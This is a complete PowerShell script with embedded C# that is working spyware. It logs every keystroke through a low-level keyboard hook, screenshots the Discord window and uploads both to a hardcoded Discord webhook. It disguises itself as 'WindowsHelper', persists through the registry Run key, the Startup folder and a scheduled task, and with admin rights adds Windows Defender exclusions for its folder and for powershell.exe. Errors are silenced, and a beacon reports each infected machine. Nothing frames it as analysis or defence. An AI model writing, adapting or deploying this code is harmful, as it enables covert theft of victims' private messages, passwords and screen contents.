$ErrorActionPreference = 'SilentlyContinue'
# ======================= CONFIG =======================
$Webhooks    = @("https://discord.com/api/webhooks/1569542381072814221/6QObZS_5JMHMQOJ3y_Pog5PyLgiesDP-uaC802RQTSY5afaU20eZTa9CqcsNXjIbwZif")   # add a 2nd to alternate
$ArmProcs    = @("discord")        # processes that arm high-rate capture
$ArmMode     = "foreground"        # "foreground" = only while focused, "process" = while running at all
$WindowOnly  = $true               # capture just the Discord window, not the whole screen
$ActiveShot  = 4                   # seconds between shots while armed
$IdleShot    = 60                  # seconds between shots while unarmed
$IdleCapture = $false              # $false = no shots at all when unarmed
$KeyPauseMs  = 1200                # flush keystrokes after this much typing silence
$MaxBufChars = 4000                # force a flush if the buffer gets this big
$MaxFlushSec = 30                  # backstop: never hold keys longer than this
$Quality     = 45
$MaxWidth    = 1280
$TitleRx     = ""
# ======================================================

$Dir    = "$env:APPDATA\Microsoft\WindowsHelper"
$Target = "$Dir\w.ps1"
$Vbs    = "$Dir\w.vbs"
$Log    = "$Dir\keys.log"
New-Item -ItemType Directory -Force -Path $Dir | Out-Null

$mtx = New-Object Threading.Mutex($false, "WinHelperAgent")
if (-not $mtx.WaitOne(0)) { exit }

$Self = $MyInvocation.MyCommand.Path
if ($Self -and ($Self -ne $Target)) { Copy-Item $Self $Target -Force }

$src = @'
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

public class Agent
{
    public static string LogFile = "", TitleRx = "";
    public static string[] Webhooks = new string[0];
    public static string[] Procs = new string[0];
    public static string[] ArmProcs = new string[0];
    public static string ArmMode = "foreground";
    public static bool WindowOnly = true, IdleCapture = false;
    public static int ActiveShot = 4, IdleShot = 60;
    public static int KeyPauseMs = 1200, MaxBufChars = 4000, MaxFlushSec = 30;
    public static int Quality = 45, MaxWidth = 1280;

    class Shot { public Bitmap Bmp; public string Title; public int Hash; }

    static readonly object _lk = new object();
    static readonly object _ql = new object();
    static readonly object _wl = new object();
    static StringBuilder _buf = new StringBuilder();
    static List<Shot> _shots = new List<Shot>();
    static long _lastKeyTick = 0;
    static long _firstKeyTick = 0;
    static int _lastHash = 0;
    static int _whIdx = 0;
    static volatile bool _procArmed = false;
    static IntPtr _hook = IntPtr.Zero;
    delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, LowLevelProc cb, IntPtr hMod, uint tid);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
    [DllImport("user32.dll")] static extern short GetAsyncKeyState(int vk);
    [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] static extern int GetWindowThreadProcessId(IntPtr h, out uint pid);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern int GetWindowText(IntPtr h, StringBuilder s, int n);
    [DllImport("user32.dll")] static extern bool GetWindowRect(IntPtr h, out RECT r);
    [DllImport("user32.dll")] static extern IntPtr GetKeyboardLayout(uint tid);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern int ToUnicodeEx(uint vk, uint sc, byte[] st, StringBuilder sb, int n, uint fl, IntPtr lay);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)] static extern IntPtr GetModuleHandle(string n);
    [DllImport("user32.dll")] static extern bool SetProcessDPIAware();
    [DllImport("shcore.dll")] static extern int SetProcessDpiAwareness(int v);
    [DllImport("user32.dll")] static extern IntPtr SetProcessDpiAwarenessContext(IntPtr ctx);

    [StructLayout(LayoutKind.Sequential)]
    struct RECT { public int Left, Top, Right, Bottom; }

    static Agent()
    {
        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
        ServicePointManager.Expect100Continue = false;
        ServicePointManager.DefaultConnectionLimit = 20;
    }

    public static void Start()
    {
        try { SetProcessDpiAwarenessContext(new IntPtr(-4)); }
        catch { try { SetProcessDpiAwareness(2); } catch { SetProcessDPIAware(); } }

        Thread h = new Thread(HookThread); h.IsBackground = true; h.SetApartmentState(ApartmentState.STA); h.Priority = ThreadPriority.AboveNormal; h.Start();
        Thread c = new Thread(CaptureLoop); c.IsBackground = true; c.Start();
        Thread u = new Thread(UploadLoop);  u.IsBackground = true; u.Start();
        if (ArmMode == "process") { Thread a = new Thread(ArmedPoll); a.IsBackground = true; a.Start(); }
    }

    static void HookThread()
    {
        _hook = SetWindowsHookEx(13, new LowLevelProc(HookProc), GetModuleHandle(null), 0);
        Application.Run();
    }

    static void ArmedPoll()
    {
        while (true)
        {
            bool found = false;
            foreach (string p in ArmProcs)
            {
                try { if (Process.GetProcessesByName(p).Length > 0) { found = true; break; } } catch { }
            }
            _procArmed = found;
            Thread.Sleep(4000);
        }
    }

    static string Translate(int vk, int sc)
    {
        byte[] st = new byte[256];
        if (GetAsyncKeyState(0x10) < 0 || GetAsyncKeyState(0xA0) < 0 || GetAsyncKeyState(0xA1) < 0) st[0x10] = 0x80;
        if (GetAsyncKeyState(0x12) < 0) st[0x12] = 0x80;
        if ((GetAsyncKeyState(0x14) & 1) != 0) st[0x14] = 0x01;
        StringBuilder sb = new StringBuilder(8);
        int r = ToUnicodeEx((uint)vk, (uint)sc, st, sb, 8, 0, GetKeyboardLayout(0));
        if (r != 0) return sb.ToString();
        return null;
    }

    static string Special(int vk)
    {
        switch (vk)
        {
            case 0x0D: return "\n";
            case 0x08: return "[BKSP]";
            case 0x09: return "[TAB]";
            case 0x1B: return "[ESC]";
            case 0x2E: return "[DEL]";
            case 0x25: return "[LEFT]"; case 0x26: return "[UP]";
            case 0x27: return "[RIGHT]"; case 0x28: return "[DOWN]";
            case 0x24: return "[HOME]"; case 0x23: return "[END]";
            case 0x11: return "[CTRL]"; case 0x12: return "[ALT]"; case 0x5B: return "[WIN]";
            case 0x2C: return "[PRTSC]";
        }
        if (vk >= 0x70 && vk <= 0x87) return "[F" + (vk - 0x6F) + "]";
        return null;
    }

    static IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam)
    {
        try
        {
            if (nCode >= 0 && (wParam == (IntPtr)0x100 || wParam == (IntPtr)0x104))
            {
                int vk = Marshal.ReadInt32(lParam);
                int sc = Marshal.ReadInt32(lParam, 4);
                string s = Translate(vk, sc);
                if (string.IsNullOrEmpty(s)) s = Special(vk);
                if (!string.IsNullOrEmpty(s))
                {
                    lock (_lk)
                    {
                        if (_buf.Length == 0) _firstKeyTick = DateTime.Now.Ticks;
                        _buf.Append(s);
                    }
                    Interlocked.Exchange(ref _lastKeyTick, DateTime.Now.Ticks);
                }
            }
        }
        catch { }
        return CallNextHookEx(_hook, nCode, wParam, lParam);
    }

    // ---- foreground helpers ----
    static string ForegroundProc(out IntPtr hwnd, out string title)
    {
        hwnd = GetForegroundWindow();
        title = "";
        if (hwnd == IntPtr.Zero) return "";
        uint pid;
        GetWindowThreadProcessId(hwnd, out pid);
        StringBuilder sb = new StringBuilder(512);
        GetWindowText(hwnd, sb, 512);
        title = sb.ToString();
        try { return Process.GetProcessById((int)pid).ProcessName.ToLower(); } catch { return ""; }
    }

    static bool IsArmed(out IntPtr hwnd, out string title, out string fgProc)
    {
        fgProc = ForegroundProc(out hwnd, out title);
        if (ArmMode == "process") return _procArmed;
        foreach (string p in ArmProcs)
            if (fgProc == p.ToLower() || fgProc.Contains(p.ToLower())) return true;
        return false;
    }

    static bool ShotAllowed(out string title)
    {
        IntPtr hwnd;
        string fgProc;
        title = "";
        if (!IsArmed(out hwnd, out title, out fgProc)) return false;
        bool procOk = false;
        foreach (string p in Procs)
            if (p == "*" || fgProc.Contains(p.ToLower())) { procOk = true; break; }
        if (!procOk) return false;
        if (TitleRx != "" && !Regex.IsMatch(title, TitleRx, RegexOptions.IgnoreCase)) return false;
        return true;
    }

    // ---- capture ----
    static void CaptureLoop()
    {
        Stopwatch sw = Stopwatch.StartNew();
        while (true)
        {
            IntPtr hwnd; string title, fgProc;
            bool armed = IsArmed(out hwnd, out title, out fgProc);
            if (!armed && !IdleCapture) { Thread.Sleep(700); continue; }

            int interval = armed ? ActiveShot : IdleShot;
            long due = (long)interval * 1000 - sw.ElapsedMilliseconds;
            if (due > 0) { Thread.Sleep((int)Math.Min(due, 400L)); continue; }
            sw.Restart();

            string t;
            if (!ShotAllowed(out t)) continue;

            Bitmap bmp;
            try { bmp = Grab(hwnd, WindowOnly && armed); } catch { continue; }
            if (bmp == null) continue;

            int hh = Hash(bmp);
            if (hh == _lastHash) { bmp.Dispose(); continue; }
            _lastHash = hh;

            Shot s = new Shot(); s.Bmp = bmp; s.Title = t; s.Hash = hh;
            lock (_ql)
            {
                if (_shots.Count >= 2) { _shots[0].Bmp.Dispose(); _shots.RemoveAt(0); }
                _shots.Add(s);
            }
        }
    }

    static int Hash(Bitmap bmp)
    {
        int h = 17;
        int stepX = Math.Max(1, bmp.Width / 120);
        int stepY = Math.Max(1, bmp.Height / 80);
        for (int y = 0; y < bmp.Height; y += stepY)
            for (int x = 0; x < bmp.Width; x += stepX)
                h = h * 31 + bmp.GetPixel(x, y).ToArgb();
        return h;
    }

    static Bitmap Grab(IntPtr hwnd, bool windowOnly)
    {
        Rectangle vs = SystemInformation.VirtualScreen;
        Rectangle r = vs;
        if (windowOnly && hwnd != IntPtr.Zero)
        {
            RECT wr;
            if (GetWindowRect(hwnd, out wr))
            {
                Rectangle w = Rectangle.FromLTRB(wr.Left, wr.Top, wr.Right, wr.Bottom);
                w.Intersect(vs);
                if (w.Width >= 200 && w.Height >= 150) r = w;
            }
        }
        if (r.Width < 100 || r.Height < 100) r = new Rectangle(0, 0, 1920, 1080);

        Bitmap bmp = new Bitmap(r.Width, r.Height, PixelFormat.Format24bppRgb);
        using (Graphics g = Graphics.FromImage(bmp))
            g.CopyFromScreen(r.X, r.Y, 0, 0, r.Size, CopyPixelOperation.SourceCopy);
        return bmp;
    }

    // ---- upload ----
    static void UploadLoop()
    {
        while (true)
        {
            Thread.Sleep(200);

            bool haveKeys, haveShot;
            lock (_lk) haveKeys = _buf.Length > 0;
            lock (_ql) haveShot = _shots.Count > 0;
            if (!haveKeys && !haveShot) continue;

            if (haveKeys)
            {
                long idleMs = (DateTime.Now.Ticks - Interlocked.Read(ref _lastKeyTick)) / TimeSpan.TicksPerMillisecond;
                long heldMs = (DateTime.Now.Ticks - Interlocked.Read(ref _firstKeyTick)) / TimeSpan.TicksPerMillisecond;
                int blen; lock (_lk) blen = _buf.Length;

                if (idleMs < KeyPauseMs && blen < MaxBufChars && heldMs < MaxFlushSec * 1000)
                {
                    if (!haveShot) continue;   // a pending frame can go immediately
                    // otherwise let the frame ride along with the next key batch
                    long wait = KeyPauseMs - idleMs;
                    if (wait > 0) { Thread.Sleep((int)Math.Min(wait, 300)); continue; }
                }
            }

            string keys = null;
            lock (_lk) { if (_buf.Length > 0) { keys = _buf.ToString(); _buf.Length = 0; } }

            Shot shot = null;
            lock (_ql) { if (_shots.Count > 0) { shot = _shots[0]; _shots.RemoveAt(0); } }

            if (keys == null && shot == null) continue;

            List<string> names = new List<string>();
            List<byte[]> datas = new List<byte[]>();
            List<string> mimes = new List<string>();
            StringBuilder content = new StringBuilder();

            if (keys != null)
            {
                try { File.AppendAllText(LogFile, keys); } catch { }
                content.Append("**" + Environment.MachineName + "** `" + DateTime.Now.ToString("HH:mm:ss") + "`\n```\n" + Cut(keys, 1500) + "\n```");
                names.Add("keys.txt"); datas.Add(Encoding.UTF8.GetBytes(keys)); mimes.Add("text/plain");
            }
            if (shot != null)
            {
                byte[] jpg = null;
                try { jpg = Encode(shot.Bmp); } catch { }
                shot.Bmp.Dispose();
                if (jpg != null && jpg.Length > 0)
                {
                    if (content.Length > 0) content.Append("\n");
                    content.Append("**Screenshot** `" + DateTime.Now.ToString("HH:mm:ss") + "` " + Cut(shot.Title, 180));
                    names.Add("shot_" + DateTime.Now.ToString("HHmmss") + ".jpg"); datas.Add(jpg); mimes.Add("image/jpeg");
                }
            }
            if (datas.Count == 0) continue;

            try { Post(content.ToString(), names.ToArray(), datas.ToArray(), mimes.ToArray()); } catch { }
        }
    }

    static byte[] Encode(Bitmap bmp)
    {
        Bitmap src = bmp;
        if (src.Width > MaxWidth)
        {
            int nh = (int)(src.Height * ((double)MaxWidth / src.Width));
            src = new Bitmap(bmp, MaxWidth, nh);
        }
        ImageCodecInfo codec = null;
        foreach (ImageCodecInfo c in ImageCodecInfo.GetImageEncoders())
            if (c.MimeType == "image/jpeg") codec = c;
        EncoderParameters ep = new EncoderParameters(1);
        ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)Quality);
        MemoryStream ms = new MemoryStream();
        if (codec != null) src.Save(ms, codec, ep); else src.Save(ms, ImageFormat.Jpeg);
        if (src != bmp) src.Dispose();
        return ms.ToArray();
    }

    static string Cut(string s, int n) { return s.Length <= n ? s : s.Substring(0, n) + "..."; }

    static string Q(string s)
    {
        StringBuilder sb = new StringBuilder("\"");
        foreach (char c in s)
        {
            if (c == '"' || c == '\\') sb.Append('\\').Append(c);
            else if (c == '\n') sb.Append("\\n");
            else if (c == '\r') { }
            else if (c < 0x20) { }
            else sb.Append(c);
        }
        return sb.Append('"').ToString();
    }

    static string NextHook()
    {
        lock (_wl) { string u = Webhooks[_whIdx % Webhooks.Length]; _whIdx++; return u; }
    }

    public static void Post(string content, string[] names, byte[][] datas, string[] mimes)
    {
        string bnd = "----" + Guid.NewGuid().ToString("N");
        MemoryStream ms = new MemoryStream();
        byte[] pre = Encoding.UTF8.GetBytes("--" + bnd + "\r\nContent-Disposition: form-data; name=\"payload_json\"\r\n\r\n" +
                     "{\"content\":" + Q(content) + "}\r\n");
        ms.Write(pre, 0, pre.Length);

        for (int i = 0; i < names.Length; i++)
        {
            byte[] hdr = Encoding.UTF8.GetBytes("--" + bnd + "\r\nContent-Disposition: form-data; name=\"files[" + i +
                          "]\"; filename=\"" + names[i] + "\"\r\nContent-Type: " + mimes[i] + "\r\n\r\n");
            ms.Write(hdr, 0, hdr.Length);
            ms.Write(datas[i], 0, datas[i].Length);
            ms.Write(new byte[] { 13, 10 }, 0, 2);
        }
        byte[] tail = Encoding.UTF8.GetBytes("--" + bnd + "--\r\n");
        ms.Write(tail, 0, tail.Length);
        byte[] all = ms.ToArray();

        HttpWebRequest req = (HttpWebRequest)WebRequest.Create(NextHook());
        req.Proxy = null;
        req.KeepAlive = true;
        req.ServicePoint.ConnectionLimit = 20;
        req.Method = "POST";
        req.ContentType = "multipart/form-data; boundary=" + bnd;
        req.Timeout = 30000;
        req.ReadWriteTimeout = 30000;
        req.ContentLength = all.Length;

        using (Stream s = req.GetRequestStream()) s.Write(all, 0, all.Length);
        try { using (HttpWebResponse r = (HttpWebResponse)req.GetResponse()) { } }
        catch (WebException we)
        {
            HttpWebResponse er = we.Response as HttpWebResponse;
            if (er != null && (int)er.StatusCode == 429) Thread.Sleep(5000);
        }
    }
}
'@

Add-Type -AssemblyName System.Windows.Forms, System.Drawing
Add-Type -TypeDefinition $src -ReferencedAssemblies System.Windows.Forms, System.Drawing -Language CSharp

[Agent]::Webhooks    = $Webhooks
[Agent]::LogFile     = $Log
[Agent]::Procs       = $ShotProcs
[Agent]::ArmProcs    = $ArmProcs
[Agent]::ArmMode     = $ArmMode
[Agent]::WindowOnly  = $WindowOnly
[Agent]::IdleCapture = $IdleCapture
[Agent]::ActiveShot  = $ActiveShot
[Agent]::IdleShot    = $IdleShot
[Agent]::KeyPauseMs  = $KeyPauseMs
[Agent]::MaxBufChars = $MaxBufChars
[Agent]::MaxFlushSec = $MaxFlushSec
[Agent]::TitleRx     = $TitleRx
[Agent]::Quality     = $Quality
[Agent]::MaxWidth    = $MaxWidth

$vbsBody = 'Set s = CreateObject("WScript.Shell")' + "`r`n" +
           's.Run "powershell -w hidden -ep bypass -f ""' + $Target + '""", 0, False'
Set-Content -Path $Vbs -Value $vbsBody -Encoding ASCII

Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
                 -Name 'WindowsHelper' -Value ('wscript.exe "' + $Vbs + '"')

Copy-Item $Vbs (Join-Path ([Environment]::GetFolderPath('Startup')) 'WindowsHelper.vbs') -Force

$admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
         ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($admin) {
    schtasks /create /tn "WindowsHelper" /f /sc onlogon /rl highest `
        /tr ('wscript.exe "' + $Vbs + '"') 2>&1 | Out-Null
    Add-MpPreference -ExclusionPath $Dir 2>&1 | Out-Null
    Add-MpPreference -ExclusionProcess "powershell.exe" 2>&1 | Out-Null
}

[Agent]::Start()

$g = [System.Windows.Forms.SystemInformation]::VirtualScreen
$diag = "**agent up** $env:COMPUTERNAME — geometry $($g.Width)x$($g.Height), arm=$ArmMode"
try { [Agent]::Post($diag, @("info.txt"), @([Text.Encoding]::UTF8.GetBytes($diag)), @("text/plain")) } catch {}

while ($true) { Start-Sleep -Seconds 60 }